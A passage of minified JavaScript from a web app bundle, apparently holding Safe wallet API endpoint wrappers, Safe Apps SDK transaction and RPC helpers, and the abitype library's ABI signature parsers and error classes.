L(Ne,Ve={}){return(0,r.getEndpoint)(s,"/v2/chains/{chainId}/delegates",{path:{chainId:Ne},query:Ve})}function V(Ne){return(0,r.postEndpoint)(s,"/v1/register/notifications",{body:Ne})}function G(Ne,Ve,Qe){return(0,r.deleteEndpoint)(s,"/v1/chains/{chainId}/notifications/devices/{uuid}/safes/{safe_address}",{path:{chainId:Ne,safe_address:Ve,uuid:Qe}})}function Z(Ne,Ve){return(0,r.deleteEndpoint)(s,"/v1/chains/{chainId}/notifications/devices/{uuid}",{path:{chainId:Ne,uuid:Ve}})}function J(Ne,Ve,Qe,dt){return(0,r.postEndpoint)(s,"/v1/chains/{chainId}/safes/{safe_address}/emails",{path:{chainId:Ne,safe_address:Ve},body:Qe,headers:dt})}function ne(Ne,Ve,Qe,dt,cr){return(0,r.putEndpoint)(s,"/v1/chains/{chainId}/safes/{safe_address}/emails/{signer}",{path:{chainId:Ne,safe_address:Ve,signer:Qe},body:dt,headers:cr})}function re(Ne,Ve,Qe){return(0,r.postEndpoint)(s,"/v1/chains/{chainId}/safes/{safe_address}/emails/{signer}/verify-resend",{path:{chainId:Ne,safe_address:Ve,signer:Qe},body:""})}function le(Ne,Ve,Qe,dt){return(0,r.putEndpoint)(s,"/v1/chains/{chainId}/safes/{safe_address}/emails/{signer}/verify",{path:{chainId:Ne,safe_address:Ve,signer:Qe},body:dt})}function oe(Ne,Ve,Qe,dt){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}/safes/{safe_address}/emails/{signer}",{path:{chainId:Ne,safe_address:Ve,signer:Qe},headers:dt})}function ue(Ne,Ve,Qe,dt){return(0,r.deleteEndpoint)(s,"/v1/chains/{chainId}/safes/{safe_address}/emails/{signer}",{path:{chainId:Ne,safe_address:Ve,signer:Qe},headers:dt})}function be(Ne,Ve,Qe){return(0,r.postEndpoint)(s,"/v1/chains/{chainId}/safes/{safe_address}/recovery",{path:{chainId:Ne,safe_address:Ve},body:Qe})}function Me(Ne){return(0,r.deleteEndpoint)(s,"/v1/subscriptions",{query:Ne})}function Te(Ne){return(0,r.deleteEndpoint)(s,"/v1/subscriptions/all",{query:Ne})}function Oe(Ne,Ve){return(0,r.getEndpoint)(s,"/v1/safes",{query:Object.assign(Object.assign({},Ve),{safes:Ne.join(",")})})}function Ke(Ne,Ve){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}/contracts/{contractAddress}",{path:{chainId:Ne,contractAddress:Ve}})}function it(){return(0,r.getEndpoint)(s,"/v1/auth/nonce",{credentials:"include"})}function at(Ne){return(0,r.postEndpoint)(s,"/v1/auth/verify",{body:Ne,credentials:"include"})}function At(Ne){return(0,r.postEndpoint)(s,"/v1/accounts",{body:Ne,credentials:"include"})}function Et(Ne){return(0,r.getEndpoint)(s,"/v1/accounts/{address}",{path:{address:Ne},credentials:"include"})}function ze(Ne){return(0,r.deleteEndpoint)(s,"/v1/accounts/{address}",{path:{address:Ne},credentials:"include"})}function Re(){return(0,r.getEndpoint)(s,"/v1/accounts/data-types")}function xn(Ne){return(0,r.getEndpoint)(s,"/v1/accounts/{address}/data-settings",{path:{address:Ne},credentials:"include"})}function Ln(Ne,Ve){return(0,r.putEndpoint)(s,"/v1/accounts/{address}/data-settings",{path:{address:Ne},body:Ve,credentials:"include"})}function Nn(Ne){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}/about/indexing",{path:{chainId:Ne}})}})(sm)),sm}var SK;function vFe(){return SK||(SK=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.TransferDirection=t.TransactionStatus=t.TokenType=t.Operation=void 0;var e=wFe();Object.defineProperty(t,"Operation",{enumerable:!0,get:function(){return e.Operation}}),Object.defineProperty(t,"TokenType",{enumerable:!0,get:function(){return e.TokenType}}),Object.defineProperty(t,"TransactionStatus",{enumerable:!0,get:function(){return e.TransactionStatus}}),Object.defineProperty(t,"TransferDirection",{enumerable:!0,get:function(){return e.TransferDirection}})})(LO)),LO}var HO={},TK;function EFe(){return TK||(TK=1,Object.defineProperty(HO,"__esModule",{value:!0}),ry()),HO}var xK;function Dj(){return xK||(xK=1,(function(t){var e=im&&im.__createBinding||(Object.create?(function(r,i,s,o){o===void 0&&(o=s);var a=Object.getOwnPropertyDescriptor(i,s);(!a||("get"in a?!i.__esModule:a.writable||a.configurable))&&(a={enumerable:!0,get:function(){return i[s]}}),Object.defineProperty(r,o,a)}):(function(r,i,s,o){o===void 0&&(o=s),r[o]=i[s]})),n=im&&im.__exportStar||function(r,i){for(var s in r)s!=="default"&&!Object.prototype.hasOwnProperty.call(i,s)&&e(i,r,s)};Object.defineProperty(t,"__esModule",{value:!0}),n(iFe(),t),n(sFe(),t),n(vFe(),t),n(EFe(),t)})(im)),im}var IK;function _Fe(){if(IK)return qv;IK=1,Object.defineProperty(qv,"__esModule",{value:!0}),qv.TXs=void 0;const t=ry(),e=Dj();class n{constructor(i){this.communicator=i}async getBySafeTxHash(i){if(!i)throw new Error("Invalid safeTxHash");return(await this.communicator.send(t.Methods.getTxBySafeTxHash,{safeTxHash:i})).data}async signMessage(i){const s={message:i};return(await this.communicator.send(t.Methods.signMessage,s)).data}async signTypedMessage(i){if(!(0,e.isObjectEIP712TypedData)(i))throw new Error("Invalid typed data");return(await this.communicator.send(t.Methods.signTypedMessage,{typedData:i})).data}async send({txs:i,params:s}){if(!i||!i.length)throw new Error("No transactions were passed");const o={txs:i,params:s};return(await this.communicator.send(t.Methods.sendTransactions,o)).data}}return qv.TXs=n,qv}var Yv={},Qv={},RK;function Bj(){return RK||(RK=1,Object.defineProperty(Qv,"__esModule",{value:!0}),Qv.RPC_CALLS=void 0,Qv.RPC_CALLS={eth_call:"eth_call",eth_gasPrice:"eth_gasPrice",eth_getLogs:"eth_getLogs",eth_getBalance:"eth_getBalance",eth_getCode:"eth_getCode",eth_getBlockByHash:"eth_getBlockByHash",eth_getBlockByNumber:"eth_getBlockByNumber",eth_getStorageAt:"eth_getStorageAt",eth_getTransactionByHash:"eth_getTransactionByHash",eth_getTransactionReceipt:"eth_getTransactionReceipt",eth_getTransactionCount:"eth_getTransactionCount",eth_estimateGas:"eth_estimateGas",safe_setSettings:"safe_setSettings"}),Qv}var PK;function AFe(){if(PK)return Yv;PK=1,Object.defineProperty(Yv,"__esModule",{value:!0}),Yv.Eth=void 0;const t=Bj(),e=ry(),n={defaultBlockParam:(i="latest")=>i,returnFullTxObjectParam:(i=!1)=>i,blockNumberToHex:i=>Number.isInteger(i)?`0x${i.toString(16)}`:i};class r{constructor(s){this.communicator=s,this.call=this.buildRequest({call:t.RPC_CALLS.eth_call,formatters:[null,n.defaultBlockParam]}),this.getBalance=this.buildRequest({call:t.RPC_CALLS.eth_getBalance,formatters:[null,n.defaultBlockParam]}),this.getCode=this.buildRequest({call:t.RPC_CALLS.eth_getCode,formatters:[null,n.defaultBlockParam]}),this.getStorageAt=this.buildRequest({call:t.RPC_CALLS.eth_getStorageAt,formatters:[null,n.blockNumberToHex,n.defaultBlockParam]}),this.getPastLogs=this.buildRequest({call:t.RPC_CALLS.eth_getLogs}),this.getBlockByHash=this.buildRequest({call:t.RPC_CALLS.eth_getBlockByHash,formatters:[null,n.returnFullTxObjectParam]}),this.getBlockByNumber=this.buildRequest({call:t.RPC_CALLS.eth_getBlockByNumber,formatters:[n.blockNumberToHex,n.returnFullTxObjectParam]}),this.getTransactionByHash=this.buildRequest({call:t.RPC_CALLS.eth_getTransactionByHash}),this.getTransactionReceipt=this.buildRequest({call:t.RPC_CALLS.eth_getTransactionReceipt}),this.getTransactionCount=this.buildRequest({call:t.RPC_CALLS.eth_getTransactionCount,formatters:[null,n.defaultBlockParam]}),this.getGasPrice=this.buildRequest({call:t.RPC_CALLS.eth_gasPrice}),this.getEstimateGas=o=>this.buildRequest({call:t.RPC_CALLS.eth_estimateGas})([o]),this.setSafeSettings=this.buildRequest({call:t.RPC_CALLS.safe_setSettings})}buildRequest(s){const{call:o,formatters:a}=s;return async c=>{a&&Array.isArray(c)&&a.forEach((h,m)=>{h&&(c[m]=h(c[m]))});const l={call:o,params:c||[]};return(await this.communicator.send(e.Methods.rpcCall,l)).data}}}return Yv.Eth=r,Yv}var Vd={},zO={},qO={},Jv={},Xv={},NK;function CFe(){return NK||(NK=1,Object.defineProperty(Xv,"__esModule",{value:!0}),Xv.version=void 0,Xv.version="1.1.0"),Xv}var OK;function mw(){if(OK)return Jv;OK=1,Object.defineProperty(Jv,"__esModule",{value:!0}),Jv.BaseError=void 0;const t=CFe();class e extends Error{constructor(r,i={}){const s=i.cause instanceof e?i.cause.details:i.cause?.message?i.cause.message:i.details,o=i.cause instanceof e&&i.cause.docsPath||i.docsPath,a=[r||"An error occurred.","",...i.metaMessages?[...i.metaMessages,""]:[],...o?[`Docs: https://abitype.dev${o}`]:[],...s?[`Details: ${s}`]:[],`Version: abitype@${t.version}`].join(`
`);super(a),Object.defineProperty(this,"details",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docsPath",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"metaMessages",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"shortMessage",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiTypeError"}),i.cause&&(this.cause=i.cause),this.details=s,this.docsPath=o,this.metaMessages=i.metaMessages,this.shortMessage=r}}return Jv.BaseError=e,Jv}var p6={},kK;function SFe(){if(kK)return p6;kK=1,Object.defineProperty(p6,"__esModule",{value:!0}),p6.narrow=t;function t(e){return e}return p6}var m6={},g6={},y6={},b6={},Sl={},DK;function D8(){if(DK)return Sl;DK=1,Object.defineProperty(Sl,"__esModule",{value:!0}),Sl.isTupleRegex=Sl.integerRegex=Sl.bytesRegex=void 0,Sl.execTyped=t;function t(e,n){return e.exec(n)?.groups}return Sl.bytesRegex=/^bytes([1-9]|1[0-9]|2[0-9]|3[0-2])?$/,Sl.integerRegex=/^u?int(8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?$/,Sl.isTupleRegex=/^\(.+?\).*?$/,Sl}var BK;function tle(){if(BK)return b6;BK=1,Object.defineProperty(b6,"__esModule",{value:!0}),b6.formatAbiParameter=n;const t=D8(),e=/^tuple(?<array>(\[(\d*)\])*)$/;function n(r){let i=r.type;if(e.test(r.type)&&"components"in r){i="(";const s=r.components.length;for(let a=0;a<s;a++){const c=r.components[a];i+=n(c),a<s-1&&(i+=", ")}const o=(0,t.execTyped)(e,r.type);return i+=`)${o?.array??""}`,n({...r,type:i})}return"indexed"in r&&r.indexed&&(i=`${i} indexed`),r.name?`${i} ${r.name}`:i}return b6}var jK;function nle(){if(jK)return y6;jK=1,Object.defineProperty(y6,"__esModule",{value:!0}),y6.formatAbiParameters=e;const t=tle();function e(n){let r="";const i=n.length;for(let s=0;s<i;s++){const o=n[s];r+=(0,t.formatAbiParameter)(o),s!==i-1&&(r+=", ")}return r}return y6}var MK;function rle(){if(MK)return g6;MK=1,Object.defineProperty(g6,"__esModule",{value:!0}),g6.formatAbiItem=e;const t=nle();function e(n){return n.type==="function"?`function ${n.name}(${(0,t.formatAbiParameters)(n.inputs)})${n.stateMutability&&n.stateMutability!=="nonpayable"?` ${n.stateMutability}`:""}${n.outputs?.length?` returns (${(0,t.formatAbiParameters)(n.outputs)})`:""}`:n.type==="event"?`event ${n.name}(${(0,t.formatAbiParameters)(n.inputs)})`:n.type==="error"?`error ${n.name}(${(0,t.formatAbiParameters)(n.inputs)})`:n.type==="constructor"?`constructor(${(0,t.formatAbiParameters)(n.inputs)})${n.stateMutability==="payable"?" payable":""}`:n.type==="fallback"?`fallback() external${n.stateMutability==="payable"?" payable":""}`:"receive() external payable"}return g6}var UK;function TFe(){if(UK)return m6;UK=1,Object.defineProperty(m6,"__esModule",{value:!0}),m6.formatAbi=e;const t=rle();function e(n){const r=[],i=n.length;for(let s=0;s<i;s++){const o=n[s],a=(0,t.formatAbiItem)(o);r.push(a)}return r}return m6}var w6={},ii={},LK;function gw(){if(LK)return ii;LK=1,Object.defineProperty(ii,"__esModule",{value:!0}),ii.functionModifiers=ii.eventModifiers=ii.modifiers=void 0,ii.isErrorSignature=n,ii.execErrorSignature=r,ii.isEventSignature=s,ii.execEventSignature=o,ii.isFunctionSignature=c,ii.execFunctionSignature=l,ii.isStructSignature=h,ii.execStructSignature=m,ii.isConstructorSignature=w,ii.execConstructorSignature=y,ii.isFallbackSignature=A,ii.execFallbackSignature=R,ii.isReceiveSignature=v;const t=D8(),e=/^error (?<name>[a-zA-Z$_][a-zA-Z0-9$_]*)\((?<parameters>.*?)\)$/;function n(k){return e.test(k)}function r(k){return(0,t.execTyped)(e,k)}const i=/^event (?<name>[a-zA-Z$_][a-zA-Z0-9$_]*)\((?<parameters>.*?)\)$/;function s(k){return i.test(k)}function o(k){return(0,t.execTyped)(i,k)}const a=/^function (?<name>[a-zA-Z$_][a-zA-Z0-9$_]*)\((?<parameters>.*?)\)(?: (?<scope>external|public{1}))?(?: (?<stateMutability>pure|view|nonpayable|payable{1}))?(?: returns\s?\((?<returns>.*?)\))?$/;function c(k){return a.test(k)}function l(k){return(0,t.execTyped)(a,k)}const f=/^struct (?<name>[a-zA-Z$_][a-zA-Z0-9$_]*) \{(?<properties>.*?)\}$/;function h(k){return f.test(k)}function m(k){return(0,t.execTyped)(f,k)}const b=/^constructor\((?<parameters>.*?)\)(?:\s(?<stateMutability>payable{1}))?$/;function w(k){return b.test(k)}function y(k){return(0,t.execTyped)(b,k)}const E=/^fallback\(\) external(?:\s(?<stateMutability>payable{1}))?$/;function A(k){return E.test(k)}function R(k){return(0,t.execTyped)(E,k)}const S=/^receive\(\) external payable$/;function v(k){return S.test(k)}return ii.modifiers=new Set(["memory","indexed","storage","calldata"]),ii.eventModifiers=new Set(["indexed"]),ii.functionModifiers=new Set(["calldata","memory","storage"]),ii}var v6={},Wd={},FK;function B8(){if(FK)return Wd;FK=1,Object.defineProperty(Wd,"__esModule",{value:!0}),Wd.UnknownSolidityTypeError=Wd.UnknownTypeError=Wd.InvalidAbiItemError=void 0;const t=mw();class e extends t.BaseError{constructor({signature:s}){super("Failed to parse ABI item.",{details:`parseAbiItem(${JSON.stringify(s,null,2)})`,docsPath:"/api/human#parseabiitem-1"}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidAbiItemError"})}}Wd.InvalidAbiItemError=e;class n extends t.BaseError{constructor({type:s}){super("Unknown type.",{metaMessages:[`Type "${s}" is not a valid ABI type. Perhaps you forgot to include a struct signature?`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"UnknownTypeError"})}}Wd.UnknownTypeError=n;class r extends t.BaseError{constructor({type:s}){super("Unknown type.",{metaMessages:[`Type "${s}" is not a valid ABI type.`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"UnknownSolidityTypeError"})}}return Wd.UnknownSolidityTypeError=r,Wd}var vs={},$K;function kA(){if($K)return vs;$K=1,Object.defineProperty(vs,"__esModule",{value:!0}),vs.InvalidAbiTypeParameterError=vs.InvalidFunctionModifierError=vs.InvalidModifierError=vs.SolidityProtectedKeywordError=vs.InvalidParameterError=vs.InvalidAbiParametersError=vs.InvalidAbiParameterError=void 0;const t=mw();class e extends t.BaseError{constructor({param:l}){super("Failed to parse ABI parameter.",{details:`parseAbiParameter(${JSON.stringify(l,null,2)})`,docsPath:"/api/human#parseabiparameter-1"}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidAbiParameterError"})}}vs.InvalidAbiParameterError=e;class n extends t.BaseError{constructor({params:l}){super("Failed to parse ABI parameters.",{details:`parseAbiParameters(${JSON.stringify(l,null,2)})`,docsPath:"/api/human#parseabiparameters-1"}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidAbiParametersError"})}}vs.InvalidAbiParametersError=n;class r extends t.BaseError{constructor({param:l}){super("Invalid ABI parameter.",{details:l}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidParameterError"})}}vs.InvalidParameterError=r;class i extends t.BaseError{constructor({param:l,name:f}){super("Invalid ABI parameter.",{details:l,metaMessages:[`"${f}" is a protected Solidity keyword. More info: https://docs.soliditylang.org/en/latest/cheatsheet.html`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"SolidityProtectedKeywordError"})}}vs.SolidityProtectedKeywordError=i;class s extends t.BaseError{constructor({param:l,type:f,modifier:h}){super("Invalid ABI parameter.",{details:l,metaMessages:[`Modifier "${h}" not allowed${f?` in "${f}" type`:""}.`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidModifierError"})}}vs.InvalidModifierError=s;class o extends t.BaseError{constructor({param:l,type:f,modifier:h}){super("Invalid ABI parameter.",{details:l,metaMessages:[`Modifier "${h}" not allowed${f?` in "${f}" type`:""}.`,`Data location can only be specified for array, struct, or mapping types, but "${h}" was given.`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidFunctionModifierError"})}}vs.InvalidFunctionModifierError=o;class a extends t.BaseError{constructor({abiParameter:l}){super("Invalid ABI parameter.",{details:JSON.stringify(l,null,2),metaMessages:["ABI parameter type is invalid."]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidAbiTypeParameterError"})}}return vs.InvalidAbiTypeParameterError=a,vs}var Gd={},HK;function jj(){if(HK)return Gd;HK=1,Object.defineProperty(Gd,"__esModule",{value:!0}),Gd.InvalidStructSignatureError=Gd.UnknownSignatureError=Gd.InvalidSignatureError=void 0;const t=mw();class e extends t.BaseError{constructor({signature:s,type:o}){super(`Invalid ${o} signature.`,{details:s}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidSignatureError"})}}Gd.InvalidSignatureError=e;class n extends t.BaseError{constructor({signature:s}){super("Unknown signature.",{details:s}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"UnknownSignatureError"})}}Gd.UnknownSignatureError=n;class r extends t.BaseError{constructor({signature:s}){super("Invalid struct signature.",{details:s,metaMessages:["No properties exist."]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidStructSignatureError"})}}return Gd.InvalidStructSignatureError=r,Gd}var e2={},zK;function ile(){if(zK)return e2;zK=1,Object.defineProperty(e2,"__esModule",{value:!0}),e2.CircularReferenceError=void 0;const t=mw();class e extends t.BaseError{constructor({type:r}){super("Circular reference detected.",{metaMessages:[`Struct "${r}" is a circular reference.`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"CircularReferenceError"})}}return e2.CircularReferenceError=e,e2}var zo={},t2={},qK;function sle(){if(qK)return t2;qK=1,Object.defineProperty(t2,"__esModule",{value:!0}),t2.InvalidParenthesisError=void 0;const t=mw();class e extends t.BaseError{constructor({current:r,depth:i}){super("Unbalanced parentheses.",{metaMessages:[`"${r.trim()}" has too many ${i>0?"opening":"closing"} parentheses.`],details:`Depth "${i}"`}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidParenthesisError"})}}return t2.InvalidParenthesisError=e,t2}var pb={},VK;function xFe(){if(VK)return pb;VK=1,Object.defineProperty(pb,"__esModule",{value:!0}),pb.parameterCache=void 0,pb.getParameterCacheKey=t;function t(e,n,r){let i="";if(r)for(const s of Object.entries(r)){if(!s)continue;let o="";for(const a of s[1])o+=`[${a.type}${a.name?`:${a.name}`:""}]`;i+=`(${s[0]}{${o}})`}return n?`${n}:${e}${i}`:e}return pb.parameterCache=new Map([["address",{type:"address"}],["bool",{type:"bool"}],["bytes",{type:"bytes"}],["bytes32",{type:"bytes32"}],["int",{type:"int256"}],["int256",{type:"int256"}],["string",{type:"string"}],["uint",{type:"uint256"}],["uint8",{type:"uint8"}],["uint16",{type:"uint16"}],["uint24",{type:"uint24"}],["uint32",{type:"uint32"}],["uint64",{type:"uint64"}],["uint96",{type:"uint96"}],["uint112",{type:"uint112"}],["uint160",{type:"uint160"}],["uint192",{type:"uint192"}],["uint256",{type:"uint256"}],["address owner",{type:"address",name:"owner"}],["address to",{type:"address",name:"to"}],["bool approved",{type:"bool",name:"approved"}],["bytes _data",{type:"bytes",name:"_data"}],["bytes data",{type:"bytes",name:"data"}],["bytes signature",{type:"bytes",name:"signature"}],["bytes32 hash",{type:"bytes32",name:"hash"}],["bytes32 r",{type:"bytes32",name:"r"}],["bytes32 root",{type:"bytes32",name:"root"}],["bytes32 s",{type:"bytes32",name:"s"}],["string name",{type:"string",name:"name"}],["string symbol",{type:"string",name:"symbol"}],["string tokenURI",{type:"string",name:"tokenURI"}],["uint tokenId",{type:"uint256",name:"tokenId"}],["uint8 v",{type:"uint8",name:"v"}],["uint256 balance",{type:"uint256",name:"balance"}],["uint256 tokenId",{type:"uint256",name:"tokenId"}],["uint256 value",{type:"uint256",name:"value"}],["event:address indexed from",{type:"address",name:"from",indexed:!0}],["event:address indexed to",{type:"address",name:"to",indexed:!0}],["event:uint indexed tokenId",{type:"uint256",name:"tokenId",indexed:!0}],["event:uint256 indexed tokenId",{type:"uint256",name:"tokenId",indexed:!0}]]),pb}var WK;function K1(){if(WK)return zo;WK=1,Object.defineProperty(zo,"__esModule",{value:!0}),zo.parseSignature=a,zo.parseFunctionSignature=c,zo.parseEventSignature=l,zo.parseErrorSignature=f,zo.parseConstructorSignature=h,zo.parseFallbackSignature=m,zo.parseAbiParameter=E,zo.splitParameters=A,zo.isSolidityType=R,zo.isSolidityKeyword=v,zo.isValidDataLocation=k;const t=D8(),e=B8(),n=kA(),r=jj(),i=sle(),s=xFe(),o=gw();function a(O,_={}){if((0,o.isFunctionSignature)(O))return c(O,_);if((0,o.isEventSignature)(O))return l(O,_);if((0,o.isErrorSignature)(O))return f(O,_);if((0,o.isConstructorSignature)(O))return h(O,_);if((0,o.isFallbackSignature)(O))return m(O);if((0,o.isReceiveSignature)(O))return{type:"receive",stateMutability:"payable"};throw new r.UnknownSignatureError({signature:O})}function c(O,_={}){const I=(0,o.execFunctionSignature)(O);if(!I)throw new r.InvalidSignatureError({signature:O,type:"function"});const T=A(I.parameters),B=[],U=T.length;for(let N=0;N<U;N++)B.push(E(T[N],{modifiers:o.functionModifiers,structs:_,type:"function"}));const M=[];if(I.returns){const N=A(I.returns),q=N.length;for(let P=0;P<q;P++)M.push(E(N[P],{modifiers:o.functionModifiers,structs:_,type:"function"}))}return{name:I.name,type:"function",stateMutability:I.stateMutability??"nonpayable",inputs:B,outputs:M}}function l(O,_={}){const I=(0,o.execEventSignature)(O);if(!I)throw new r.InvalidSignatureError({signature:O,type:"event"});const T=A(I.parameters),B=[],U=T.length;for(let M=0;M<U;M++)B.push(E(T[M],{modifiers:o.eventModifiers,structs:_,type:"event"}));return{name:I.name,type:"event",inputs:B}}function f(O,_={}){const I=(0,o.execErrorSignature)(O);if(!I)throw new r.InvalidSignatureError({signature:O,type:"error"});const T=A(I.parameters),B=[],U=T.length;for(let M=0;M<U;M++)B.push(E(T[M],{structs:_,type:"error"}));return{name:I.name,type:"error",inputs:B}}function h(O,_={}){const I=(0,o.execConstructorSignature)(O);if(!I)throw new r.InvalidSignatureError({signature:O,type:"constructor"});const T=A(I.parameters),B=[],U=T.length;for(let M=0;M<U;M++)B.push(E(T[M],{structs:_,type:"constructor"}));return{type:"constructor",stateMutability:I.stateMutability??"nonpayable",inputs:B}}function m(O){const _=(0,o.execFallbackSignature)(O);if(!_)throw new r.InvalidSignatureError({signature:O,type:"fallback"});return{type:"fallback",stateMutability:_.stateMutability??"nonpayable"}}const b=/^(?<type>[a-zA-Z$_][a-zA-Z0-9$_]*(?:\spayable)?)(?<array>(?:\[\d*?\])+?)?(?:\s(?<modifier>calldata|indexed|memory|storage{1}))?(?:\s(?<name>[a-zA-Z$_][a-zA-Z0-9$_]*))?$/,w=/^\((?<type>.+?)\)(?<array>(?:\[\d*?\])+?)?(?:\s(?<modifier>calldata|indexed|memory|storage{1}))?(?:\s(?<name>[a-zA-Z$_][a-zA-Z0-9$_]*))?$/,y=/^u?int$/;function E(O,_){const I=(0,s.getParameterCacheKey)(O,_?.type,_?.structs);if(s.parameterCache.has(I))return s.parameterCache.get(I);const T=t.isTupleRegex.test(O),B=(0,t.execTyped)(T?w:b,O);if(!B)throw new n.InvalidParameterError({param:O});if(B.name&&v(B.name))throw new n.SolidityProtectedKeywordError({param:O,name:B.name});const U=B.name?{name:B.name}:{},M=B.modifier==="indexed"?{indexed:!0}:{},N=_?.structs??{};let q,P={};if(T){q="tuple";const j=A(B.type),z=[],$=j.length;for(let H=0;H<$;H++)z.push(E(j[H],{structs:N}));P={components:z}}else if(B.type in N)q="tuple",P={components:N[B.type]};else if(y.test(B.type))q=`${B.type}256`;else if(B.type==="address payable")q="address";else if(q=B.type,_?.type!=="struct"&&!R(q))throw new e.UnknownSolidityTypeError({type:q});if(B.modifier){if(!_?.modifiers?.has?.(B.modifier))throw new n.InvalidModifierError({param:O,type:_?.type,modifier:B.modifier});if(o.functionModifiers.has(B.modifier)&&!k(q,!!B.array))throw new n.InvalidFunctionModifierError({param:O,type:_?.type,modifier:B.modifier})}const C={type:`${q}${B.array??""}`,...U,...M,...P};return s.parameterCache.set(I,C),C}function A(O,_=[],I="",T=0){const B=O.trim().length;for(let U=0;U<B;U++){const M=O[U],N=O.slice(U+1);switch(M){case",":return T===0?A(N,[..._,I.trim()]):A(N,_,`${I}${M}`,T);case"(":return A(N,_,`${I}${M}`,T+1);case")":return A(N,_,`${I}${M}`,T-1);default:return A(N,_,`${I}${M}`,T)}}if(I==="")return _;if(T!==0)throw new i.InvalidParenthesisError({current:I,depth:T});return _.push(I.trim()),_}function R(O){return O==="address"||O==="bool"||O==="function"||O==="string"||t.bytesRegex.test(O)||t.integerRegex.test(O)}const S=/^(?:after|alias|anonymous|apply|auto|byte|calldata|case|catch|constant|copyof|default|defined|error|event|external|false|final|function|immutable|implements|in|indexed|inline|internal|let|mapping|match|memory|mutable|null|of|override|partial|private|promise|public|pure|reference|relocatable|return|returns|sizeof|static|storage|struct|super|supports|switch|this|true|try|typedef|typeof|var|view|virtual)$/;function v(O){return O==="address"||O==="bool"||O==="function"||O==="string"||O==="tuple"||t.bytesRegex.test(O)||t.integerRegex.test(O)||S.test(O)}function k(O,_){return _||O==="bytes"||O==="string"||O==="tuple"}return zo}var GK;function j8(){if(GK)return v6;GK=1,Object.defineProperty(v6,"__esModule",{value:!0}),v6.parseStructs=a;const t=D8(),e=B8(),n=kA(),r=jj(),i=ile(),s=gw(),o=K1();function a(f){const h={},m=f.length;for(let E=0;E<m;E++){const A=f[E];if(!(0,s.isStructSignature)(A))continue;const R=(0,s.execStructSignature)(A);if(!R)throw new r.InvalidSignatureError({signature:A,type:"struct"});const S=R.properties.split(";"),v=[],k=S.length;for(let O=0;O<k;O++){const I=S[O].trim();if(!I)continue;const T=(0,o.parseAbiParameter)(I,{type:"struct"});v.push(T)}if(!v.length)throw new r.InvalidStructSignatureError({signature:A});h[R.name]=v}const b={},w=Object.entries(h),y=w.length;for(let E=0;E<y;E++){const[A,R]=w[E];b[A]=l(R,h)}return b}const c=/^(?<type>[a-zA-Z$_][a-zA-Z0-9$_]*)(?<array>(?:\[\d*?\])+?)?$/;function l(f,h,m=new Set){const b=[],w=f.length;for(let y=0;y<w;y++){const E=f[y];if(t.isTupleRegex.test(E.type))b.push(E);else{const R=(0,t.execTyped)(c,E.type);if(!R?.type)throw new n.InvalidAbiTypeParameterError({abiParameter:E});const{array:S,type:v}=R;if(v in h){if(m.has(v))throw new i.CircularReferenceError({type:v});b.push({...E,type:`tuple${S??""}`,components:l(h[v]??[],h,new Set([...m,v]))})}else if((0,o.isSolidityType)(v))b.push(E);else throw new e.UnknownTypeError({type:v})}}return b}return v6}var KK;function IFe(){if(KK)return w6;KK=1,Object.defineProperty(w6,"__esModule",{value:!0}),w6.parseAbi=r;const t=gw(),e=j8(),n=K1();function r(i){const s=(0,e.parseStructs)(i),o=[],a=i.length;for(let c=0;c<a;c++){const l=i[c];(0,t.isStructSignature)(l)||o.push((0,n.parseSignature)(l,s))}return o}return w6}var E6={},ZK;function RFe(){if(ZK)return E6;ZK=1,Object.defineProperty(E6,"__esModule",{value:!0}),E6.parseAbiItem=i;const t=B8(),e=gw(),n=j8(),r=K1();function i(s){let o;if(typeof s=="string")o=(0,r.parseSignature)(s);else{const a=(0,n.parseStructs)(s),c=s.length;for(let l=0;l<c;l++){const f=s[l];if(!(0,e.isStructSignature)(f)){o=(0,r.parseSignature)(f,a);break}}}if(!o)throw new t.InvalidAbiItemError({signature:s});return o}return E6}var _6={},YK;function PFe(){if(YK)return _6;YK=1,Object.defineProperty(_6,"__esModule",{value:!0}),_6.parseAbiParameter=i;const t=kA(),e=gw(),n=j8(),r=K1();function i(s){let o;if(typeof s=="string")o=(0,r.parseAbiParameter)(s,{modifiers:e.modifiers});else{const a=(0,n.parseStructs)(s),c=s.length;for(let l=0;l<c;l++){const f=s[l];if(!(0,e.isStructSignature)(f)){o=(0,r.parseAbiParameter)(f,{modifiers:e.modifiers,structs:a});break}}}if(!o)throw new t.InvalidAbiParameterError({param:s});return o}return _6}var A6={},QK;function NFe(){if(QK)return A6;QK=1,Object.defineProperty(A6,"__esModule",{value:!0}),A6.parseAbiParameters=s;const t=kA(),e=gw(),n=j8(),r=K1(),i=K1();function s(o){const a=[];if(typeof o=="string"){const 